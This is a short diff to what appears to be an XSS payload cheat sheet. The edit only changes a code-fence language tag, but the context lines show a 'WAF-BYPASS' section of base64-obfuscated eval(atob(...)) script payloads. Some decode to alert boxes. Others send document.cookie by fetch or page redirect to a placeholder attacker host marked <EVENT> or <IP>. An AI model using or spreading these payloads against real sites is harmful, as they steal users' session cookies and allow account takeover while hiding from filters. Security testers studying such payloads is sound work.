@@ -179,7 +179,7 @@ body:document.cookie
 ```
 
 #### WAF-BYPASS
-
+```js
 <script>eval(atob('YWxlcnQoMSk='));</script>  // POC alert(1)
 
 <script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQo='));</script> // POC alert(document.cookie)
@@ -187,7 +187,7 @@ body:document.cookie
 <script>eval(atob("ZmV0Y2goJ2h0dHBzOi8vPEVWRU5UPi8/Yz0nK2J0b2EoZG9jdW1lbnQuY29va2llKSk="))</script>
 
 <script>document.location="http://<IP>/?cookie="+eval(atob("ZmV0Y2goJ2h0dHBzOi8vPEVWRU5UPi8/Yz0nK2J0b2EoZG9jdW1lbnQuY29va2llKSk="))"</script>
-```bash
+```
 
 
 ```js
@@ -367,4 +367,5 @@ postMessage()
 setRequestHeader() 
 
 ```
+
 
